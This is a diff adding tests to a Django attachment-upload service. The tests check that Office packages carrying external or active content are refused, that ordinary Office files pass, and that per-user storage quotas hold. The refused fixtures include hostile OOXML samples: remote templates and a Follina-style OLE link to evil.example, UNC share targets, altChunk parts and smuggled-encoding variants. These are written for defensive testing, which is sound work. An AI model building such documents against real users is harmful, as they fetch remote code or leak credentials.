@@ -3,6 +3,7 @@ may reach it, and what happens when storage or the scanner fails."""
 
 from __future__ import annotations
 
+import codecs
 import hashlib
 import io
 import socket
@@ -266,7 +267,7 @@ class TestRefused:
         assert upload(user_a_client, note, "x.txt", b"x").status_code == 422
 
 
-def package(parts: dict[str, str]) -> bytes:
+def package(parts: dict[str, str | bytes]) -> bytes:
     out = io.BytesIO()
     with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as built:
         for name, text in parts.items():
@@ -280,6 +281,294 @@ EXTERNAL_TEMPLATE = (
     'officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm"'
     ' TargetMode="External"/></Relationships>'
 )
+R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
+DECLARATION = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+UTF16_DECLARATION = '<?xml version="1.0" encoding="UTF-16"?>'
+
+
+def rels(*relationships: str, declaration: str = DECLARATION) -> str:
+    return (
+        f"{declaration}<Relationships"
+        ' xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+        f"{''.join(relationships)}</Relationships>"
+    )
+
+
+# The deep security audit's M-3 variants (each got past the byte search with a 201), and more
+# ways to say the same thing to Office.
+TEMPLATE = f'Id="rId1" Type="{R}attachedTemplate" Target="https://evil.example/t.dotm"'
+SETTINGS_RELS = "word/_rels/settings.xml.rels"
+DOCUMENT_RELS = "word/_rels/document.xml.rels"
+WORKBOOK_RELS = "xl/_rels/workbook.xml.rels"
+AUDIT_M3_VARIANTS = [
+    (
+        "single-quotes.docx",
+        {
+            SETTINGS_RELS: rels(
+                f"<Relationship Id='rId1' Type='{R}attachedTemplate'"
+                " Target='https://evil.example/t.dotm' TargetMode='External'/>"
+            )
+        },
+    ),
+    (
+        "spaces.docx",
+        {SETTINGS_RELS: rels(f'<Relationship {TEMPLATE} TargetMode = "External"/>')},
+    ),
+    (
+        "character-reference.docx",
+        {
+            SETTINGS_RELS: rels(
+                f'<Relationship Id="rId1" Type="{R}attached&#84;emplate"'
+                ' Target="https://evil.example/t.dotm" TargetMode="External"/>'
+            )
+        },
+    ),
+    (
+        "utf16-rels.docx",
+        {
+            SETTINGS_RELS: rels(
+                f'<Relationship {TEMPLATE} TargetMode="External"/>',
+                declaration=UTF16_DECLARATION,
+            ).encode("utf-16")
+        },
+    ),
+    (
+        "follina.docx",
+        {
+            DOCUMENT_RELS: rels(
+                f'<Relationship Id="rId9" Type="{R}oleObject"'
+                ' Target="http://evil.example/x.html!" TargetMode="External"/>'
+            )
+        },
+    ),
+    (
+        "external-image.docx",
+        {
+            DOCUMENT_RELS: rels(
+                f'<Relationship Id="rId5" Type="{R}image"'
+                ' Target="\\\\evil.example\\share\\p.png" TargetMode="External"/>'
+            )
+        },
+    ),
+    (
+        "external-link.xlsx",
+        {
+            "xl/externalLinks/externalLink1.xml": "<externalLink/>",
+            "xl/externalLinks/_rels/externalLink1.xml.rels": rels(
+                f'<Relationship Id="rId1" Type="{R}externalLinkPath"'
+                ' Target="file:///\\\\evil.example\\s\\book.xlsx" TargetMode="External"/>'
+            ),
+        },
+    ),
+    (
+        "external-link-path-elsewhere.xlsx",
+        {
+            WORKBOOK_RELS: rels(
+                f'<Relationship Id="rId1" Type="{R}externalLinkPath"'
+                ' Target="https://evil.example/book.xlsx" TargetMode="External"/>'
+            )
+        },
+    ),
+    (
+        "utf16-types-vba.docx",
+        {
+            "[Content_Types].xml": (
+                f"{UTF16_DECLARATION}<Types xmlns="
+                '"http://schemas.openxmlformats.org/package/2006/content-types">'
+                '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
+                "</Types>"
+            ).encode("utf-16")
+        },
+    ),
+    ("malformed-rels.docx", {DOCUMENT_RELS: '<Relationships><Relationship Id="r1"'}),
+    ("malformed-types.docx", {"[Content_Types].xml": "<Types>"}),
+    (
+        "entity.docx",
+        {
+            DOCUMENT_RELS: '<!DOCTYPE r [<!ENTITY m "External">]><Relationships>'
+            f'<Relationship Id="r" Type="{R}image" Target="https://evil.example/p.png"'
+            ' TargetMode="&m;"/></Relationships>'
+        },
+    ),
+    ("dtd.docx", {DOCUMENT_RELS: "<!DOCTYPE Relationships><Relationships/>"}),
+]
+MORE_M3_VARIANTS = [
+    (
+        "padded-mode.docx",
+        {
+            DOCUMENT_RELS: rels(
+                f'<Relationship Id="r" Type="{R}image" Target="https://evil.example/p.png"'
+                ' TargetMode=" external "/>'
+            )
+        },
+    ),
+    (
+        "unknown-mode.docx",
+        {
+            DOCUMENT_RELS: rels(
+                f'<Relationship Id="r" Type="{R}image" Target="p.png" TargetMode="Remote"/>'
+            )
+        },
+    ),
+    (
+        "unc-target.docx",
+        {
+            DOCUMENT_RELS: rels(
+                f'<Relationship Id="r" Type="{R}image" Target="\\\\evil.example\\s\\p.png"/>'
+            )
+        },
+    ),
+    (
+        "url-target.docx",
+        {DOCUMENT_RELS: rels(f'<Relationship Id="r" Type="{R}image" Target="https://e.x/p"/>')},
+    ),
+    (
+        "lowercase-attributes.docx",
+        {
+            DOCUMENT_RELS: rels(
+                f'<Relationship id="r" type="{R}image" target="https://e.x/p"'
+                ' targetmode="External"/>'
+            )
+        },
+    ),
+    (
+        "strict-template.docx",
+        {
+            SETTINGS_RELS: rels(
+                '<Relationship Id="r" Type="http://purl.oclc.org/ooxml/officeDocument/'
+                'relationships/attachedTemplate" Target="t.dotm"/>'
+            )
+        },
+    ),
+    (
+        "uppercase-rels-name.docx",
+        {"WORD/_RELS/SETTINGS.XML.RELS": EXTERNAL_TEMPLATE},
+    ),
+    (
+        "activex-control.docx",
+        {DOCUMENT_RELS: rels(f'<Relationship Id="r" Type="{R}control" Target="ctl.xml"/>')},
+    ),
+    (
+        "subdocument.docx",
+        {
+            DOCUMENT_RELS: rels(
+                f'<Relationship Id="r" Type="{R}subDocument" Target="part.docx"'
+                ' TargetMode="External"/>'
+            )
+        },
+    ),
+    (
+        "frame.docx",
+        {
+            "word/_rels/webSettings.xml.rels": rels(
+                f'<Relationship Id="r" Type="{R}frame" Target="f.docx"/>'
+            )
+        },
+    ),
+    (
+        "data-connection.xlsx",
+        {
+            "xl/connections.xml": "<connections/>",
+            WORKBOOK_RELS: rels(
+                f'<Relationship Id="r" Type="{R}connections" Target="connections.xml"/>'
+            ),
+        },
+    ),
+    (
+        "declared-external-link.xlsx",
+        {
+            "[Content_Types].xml": '<Types><Override PartName="/xl/links/l1.xml" ContentType='
+            '"application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"/>'
+            "</Types>"
+        },
+    ),
+    (
+        "utf8-declared-utf16.docx",
+        {DOCUMENT_RELS: rels(declaration=UTF16_DECLARATION)},
+    ),
+    (
+        "latin1-declared.docx",
+        {
+            DOCUMENT_RELS: rels(declaration='<?xml version="1.0" encoding="ISO-8859-1"?>').encode(
+                "latin-1"
+            )
+        },
+    ),
+    (
+        "utf16-without-bom.docx",
+        {DOCUMENT_RELS: rels(declaration=UTF16_DECLARATION).encode("utf-16-le")},
+    ),
+    (
+        "oversized-rels.docx",
+        {
+            DOCUMENT_RELS: rels(
+                *(
+                    f'<Relationship Id="r{n}" Type="{R}styles" Target="styles.xml"/>'
+                    for n in range(storage.OOXML_XML_PART_BYTES // 80)
+                )
+            )
+        },
+    ),
+]
+# Independent review of the M-3 fix: documents Word imports when it opens the file (altChunk),
+# Office add-ins, and a "hyperlink" that isn't one. Each case trips one rule only.
+WEBEXTENSION = "http://schemas.microsoft.com/office/2011/relationships/webextension"
+REVIEW_VARIANTS = [
+    (
+        "altchunk-relationship.docx",  # the relationship alone (a neutral part name and type)
+        {DOCUMENT_RELS: rels(f'<Relationship Id="r" Type="{R}aFChunk" Target="chunk.dat"/>')},
+    ),
+    (
+        "altchunk-rtf-part.docx",  # the part's name alone
+        {"word/afchunk.rtf": "{\\rtf1{\\object\\objautlink\\objupdate}}"},
+    ),
+    ("altchunk-mht-part.docx", {"word/chunk.MHT": "MIME-Version: 1.0"}),
+    ("altchunk-html-part.docx", {"word/chunk.html": "<img src='https://evil.example/p.png'>"}),
+    *(
+        (
+            f"declared-{label}.docx",  # the declared type alone
+            {
+                "[Content_Types].xml": f'<Types><Default Extension="dat" ContentType="{kind}"/>'
+                "</Types>"
+            },
+        )
+        for label, kind in (
+            ("rtf", "application/rtf"),
+            ("text-rtf", "text/rtf"),
+            ("mht", "message/rfc822"),
+            ("html", "text/html"),
+            ("xhtml", "application/xhtml+xml"),
+            ("webextension", "application/vnd.ms-office.webextension+xml"),
+            ("taskpanes", "application/vnd.ms-office.webextensiontaskpanes+xml"),
+        )
+    ),
+    (
+        "webextension-relationship.docx",
+        {
+            "word/_rels/taskpanes.xml.rels": rels(
+                f'<Relationship Id="r" Type="{WEBEXTENSION}" Target="addin.xml"/>'
+            )
+        },
+    ),
+    (
+        "taskpanes-relationship.docx",
+        {
+            "_rels/.rels": rels(
+                f'<Relationship Id="r" Type="{WEBEXTENSION}taskpanes" Target="word/t.xml"/>'
+            )
+        },
+    ),
+    ("webextension-part.docx", {"word/webextensions/webextension1.xml": "<x/>"}),
+    (
+        "not-really-a-hyperlink.docx",
+        {
+            DOCUMENT_RELS: rels(
+                '<Relationship Id="r" Type="http://attacker.example/hyperlink"'
+                ' Target="http://attacker.example/x.png" TargetMode="External"/>'
+            )
+        },
+    ),
+]
 
 
 class TestOfficeActiveContent:
@@ -302,12 +591,32 @@ class TestOfficeActiveContent:
             ),
             ("remote-template.docx", {"word/_rels/settings.xml.rels": EXTERNAL_TEMPLATE}),
             ("macros.xlsx", {"xl/workbook.xml": "<x/>", "xl/vbaProject.bin": "x"}),
+            *AUDIT_M3_VARIANTS,
+            *MORE_M3_VARIANTS,
+            *REVIEW_VARIANTS,
         ],
     )
     def test_refused(self, user_a_client, note, name, parts):
         main = "xl/workbook.xml" if name.endswith(".xlsx") else "word/document.xml"
         content = package({"[Content_Types].xml": TYPES, main: "<x/>", **parts})
         response = upload(user_a_client, note, name, content)
+        assert response.status_code == 400, response.content
+        assert "doesn't match its type" in response.json()["error"]["details"]["file"][0]
+        assert not Attachment.objects.exists()
+
+    def test_a_corrupt_part_is_refused_not_an_error(self, user_a_client, note):
+        """A relationships part whose deflate stream is broken (zlib.error, which zipfile
+        doesn't wrap): refused like any unreadable package, never a 500."""
+        content = bytearray(
+            package(
+                {"[Content_Types].xml": TYPES, "word/document.xml": "<x/>", DOCUMENT_RELS: rels()}
+            )
+        )
+        with zipfile.ZipFile(io.BytesIO(bytes(content))) as built:
+            start = built.getinfo(DOCUMENT_RELS).header_offset
+        name_length, extra_length = struct.unpack("<HH", content[start + 26 : start + 30])
+        content[start + 30 + name_length + extra_length] = 0xFF  # a reserved block type
+        response = upload(user_a_client, note, "corrupt.docx", bytes(content))
         assert response.status_code == 400, response.content
         assert not Attachment.objects.exists()
 
@@ -323,8 +632,10 @@ class TestOfficeActiveContent:
                 "links.docx",
                 {
                     "word/document.xml": "<x/>",
+                    # The real hyperlink Type URI (review P3-4: "http://x/hyperlink", which
+                    # this case used, is no longer a hyperlink).
                     "word/_rels/document.xml.rels": '<Relationships><Relationship Id="r"'
-                    ' Type="http://x/hyperlink" Target="https://arkray.example"'
+                    f' Type="{R}hyperlink" Target="https://arkray.example"'
                     ' TargetMode="External"/></Relationships>',
                 },
             ),
@@ -335,6 +646,122 @@ class TestOfficeActiveContent:
             user_a_client, note, name, package({"[Content_Types].xml": TYPES, **parts})
         )
         assert response.status_code == 201, response.content
+
+    @pytest.mark.parametrize("name", ["proposal.docx", "prices.xlsx", "deck.pptx"])
+    def test_real_world_packages_with_hyperlinks_pass(self, user_a_client, note, settings, name):
+        """Packages shaped like what Word, Excel and PowerPoint write: namespaces, a UTF-8
+        byte-order mark, single-quoted declarations, UTF-16 parts, internal pictures, printer
+        settings and hyperlinks to web pages and e-mail addresses (deep security audit M-3:
+        the stricter check must not refuse ordinary files)."""
+        settings.ATTACHMENT_ALLOWED_EXTENSIONS = ["docx", "xlsx", "pptx"]
+        response = upload(user_a_client, note, name, OFFICE_FILES[name])
+        assert response.status_code == 201, response.content
+
+
+def office_types(*overrides: tuple[str, str]) -> bytes:
+    defaults = (
+        ("rels", "application/vnd.openxmlformats-package.relationships+xml"),
+        ("xml", "application/xml"),
+        ("png", "image/png"),
+        ("bin", "application/vnd.openxmlformats-officedocument.spreadsheetml.printerSettings"),
+    )
+    return (
+        codecs.BOM_UTF8
+        + (
+            f"{DECLARATION}<Types"
+            ' xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
+            + "".join(f'<Default Extension="{e}" ContentType="{t}"/>' for e, t in defaults)
+            + "".join(f'<Override PartName="{p}" ContentType="{t}"/>' for p, t in overrides)
+            + "</Types>"
+        ).encode()
+    )
+
+
+PACKAGE_RELS = "http://schemas.openxmlformats.org/package/2006/relationships/metadata/"
+ML = "application/vnd.openxmlformats-officedocument."
+
+
+def office_root(main: str) -> str:
+    return rels(
+        f'<Relationship Id="rId1" Type="{R}officeDocument" Target="{main}"/>',
+        f'<Relationship Id="rId2" Type="{PACKAGE_RELS}core-properties"'
+        ' Target="docProps/core.xml"/>',
+        f'<Relationship Id="rId3" Type="{R}extended-properties" Target="docProps/app.xml"/>',
+    )
+
+
+HYPERLINKS = (
+    f'<Relationship Id="rId8" Type="{R}hyperlink" Target="https://www.arkray.example/products"'
+    ' TargetMode="External"/>',
+    f'<Relationship Id="rId9" Type="{R}hyperlink" Target="mailto:sales@lab.example"'
+    ' TargetMode="External"/>',
+    # Strict OOXML's hyperlink URI (and a Transitional one in other letter case).
+    '<Relationship Id="rId10" Type="http://purl.oclc.org/ooxml/officeDocument/relationships/'
+    'hyperlink" Target="https://www.arkray.example/" TargetMode="External"/>',
+    f'<Relationship Id="rId11" Type="{R.upper()}HYPERLINK" Target="https://lab.example/"'
+    ' TargetMode="External"/>',
+)
+OFFICE_FILES = {
+    "proposal.docx": package(
+        {
+            "[Content_Types].xml": office_types(
+                ("/word/document.xml", ML + "wordprocessingml.document.main+xml")
+            ),
+            "_rels/.rels": office_root("word/document.xml"),
+            "word/document.xml": "<w:document xmlns:w='urn:w'/>",
+            DOCUMENT_RELS: rels(
+                f'<Relationship Id="rId1" Type="{R}styles" Target="styles.xml"/>',
+                f'<Relationship Id="rId2" Type="{R}settings" Target="settings.xml"/>',
+                f'<Relationship Id="rId3" Type="{R}image" Target="media/image1.png"/>',
+                f'<Relationship Id="rId4" Type="{R}package"'
+                ' Target="embeddings/Microsoft_Excel_Worksheet.xlsx"/>',
+                *HYPERLINKS,
+            ),
+            "word/media/image1.png": PNG,
+            "word/embeddings/Microsoft_Excel_Worksheet.xlsx": "x",
+        }
+    ),
+    "prices.xlsx": package(
+        {
+            "[Content_Types].xml": office_types(
+                ("/xl/workbook.xml", ML + "spreadsheetml.sheet.main+xml")
+            ),
+            "_rels/.rels": office_root("xl/workbook.xml"),
+            "xl/workbook.xml": "<workbook/>",
+            WORKBOOK_RELS: rels(
+                f"<Relationship Id='rId1' Type='{R}worksheet' Target='worksheets/sheet1.xml'/>",
+                f"<Relationship Id='rId2' Type='{R}sharedStrings' Target='sharedStrings.xml'/>",
+                declaration="<?xml version='1.0' encoding='utf-8'?>",
+            ),
+            "xl/worksheets/_rels/sheet1.xml.rels": rels(
+                f'<Relationship Id="rId1" Type="{R}printerSettings"'
+                ' Target="../printerSettings/printerSettings1.bin"/>',
+                *HYPERLINKS,
+            ),
+            "xl/printerSettings/printerSettings1.bin": b"\x00\x01",
+        }
+    ),
+    "deck.pptx": package(
+        {
+            "[Content_Types].xml": office_types(
+                ("/ppt/presentation.xml", ML + "presentationml.presentation.main+xml")
+            ),
+            "_rels/.rels": office_root("ppt/presentation.xml"),
+            "ppt/presentation.xml": "<p:presentation xmlns:p='urn:p'/>",
+            "ppt/_rels/presentation.xml.rels": rels(
+                f'<Relationship Id="rId1" Type="{R}slide" Target="slides/slide1.xml"/>',
+            ),
+            # Written as UTF-16 (with its byte-order mark), as OPC allows.
+            "ppt/slides/_rels/slide1.xml.rels": codecs.BOM_UTF16_LE
+            + rels(
+                f'<Relationship Id="rId1" Type="{R}slideLayout"'
+                ' Target="../slideLayouts/slideLayout1.xml"/>',
+                *HYPERLINKS,
+                declaration=UTF16_DECLARATION,
+            ).encode("utf-16-le"),
+        }
+    ),
+}
 
 
 class TestAuthorization:
@@ -480,6 +907,74 @@ class TestReviewRegressions:
 def test_a_size_limit_beyond_what_the_database_stores_is_a_startup_error(settings):
     settings.ATTACHMENT_MAX_BYTES = 200 * 1024 * 1024
     assert [e.id for e in storage.check_allowed_extensions()] == ["arkray.E022"]
+
+
+def test_a_negative_storage_quota_is_a_startup_error(settings):
+    settings.ATTACHMENT_MAX_BYTES_PER_USER = -1
+    assert [e.id for e in storage.check_allowed_extensions()] == ["arkray.E023"]
+    settings.ATTACHMENT_MAX_BYTES_PER_USER = 0  # no quota: allowed
+    assert storage.check_allowed_extensions() == []
+
+
+class TestStorageQuota:
+    """Deep security audit L-7: one person's files can take at most
+    ATTACHMENT_MAX_BYTES_PER_USER of storage (the race: tests/integration/
+    test_attachment_quota_races.py)."""
+
+    def test_a_file_that_would_go_over_is_refused(self, user_a_client, note, settings):
+        settings.ATTACHMENT_MAX_BYTES_PER_USER = 10
+        assert upload(user_a_client, note, "a.txt", b"x" * 6).status_code == 201
+        response = upload(user_a_client, note, "b.txt", b"x" * 5)
+        assert response.status_code == 422, response.content
+        error = response.json()["error"]
+        assert error["code"] == "attachment_quota_exceeded"
+        assert "at most 10 bytes" in error["message"]
+        assert Attachment.objects.count() == 1
+        assert upload(user_a_client, note, "c.txt", b"x" * 4).status_code == 201  # exactly full
+        assert attachments.stored_bytes(note.created_by_id) == 10
+
+    def test_deleted_files_count_until_their_object_is_removed(self, user_a_client, note, settings):
+        settings.ATTACHMENT_MAX_BYTES_PER_USER = 10
+        attachment_id = upload(user_a_client, note, "a.txt", b"x" * 10).json()["id"]
+        assert (
+            user_a_client.delete(f"/api/v1/workspaces/me/attachments/{attachment_id}").status_code
+            == 204
+        )
+        assert upload(user_a_client, note, "b.txt", b"x").status_code == 422  # still stored
+        drain_outbox()  # the purge job removes the object
+        assert upload(user_a_client, note, "b.txt", b"x" * 10).status_code == 201
+
+    def test_each_person_has_their_own(self, user_a_client, user_b, user_b_client, note, settings):
+        settings.ATTACHMENT_MAX_BYTES_PER_USER = 10
+        assert upload(user_a_client, note, "a.txt", b"x" * 10).status_code == 201
+        lead = LeadFactory(owner=user_b)
+        theirs = NoteFactory(
+            lead=lead, opportunity=OpportunityFactory(lead=lead), created_by=user_b
+        )
+        assert upload(user_b_client, theirs, "b.txt", b"x" * 10).status_code == 201
+        assert upload(user_a_client, note, "c.txt", b"x").status_code == 422
+
+    def test_an_administrator_pays_for_what_they_add_to_someones_workspace(
+        self, admin, admin_client, user_a, user_a_client, note, settings
+    ):
+        settings.ATTACHMENT_MAX_BYTES_PER_USER = 10
+        assert upload(user_a_client, note, "a.txt", b"x" * 10).status_code == 201
+        workspace = str(user_a.pk)
+        response = upload(admin_client, note, "b.txt", b"x" * 10, workspace=workspace)
+        assert response.status_code == 201, response.content
+        assert attachments.stored_bytes(admin.pk) == 10
+
+    def test_zero_means_no_quota(self, user_a_client, note, settings):
+        settings.ATTACHMENT_MAX_BYTES_PER_USER = 0
+        settings.ATTACHMENT_MAX_BYTES = 1024
+        for n in range(3):
+            assert upload(user_a_client, note, f"{n}.txt", b"x" * 1024).status_code == 201
+
+    def test_the_default_is_two_gigabytes(self):
+        from django.conf import settings as django_settings
+
+        assert django_settings.ATTACHMENT_MAX_BYTES_PER_USER == 2 * 1024**3
+        assert "2 GB" in attachments.OVER_QUOTA.format(limit=attachments._human_size(2 * 1024**3))
 
 
 class TestOutages:
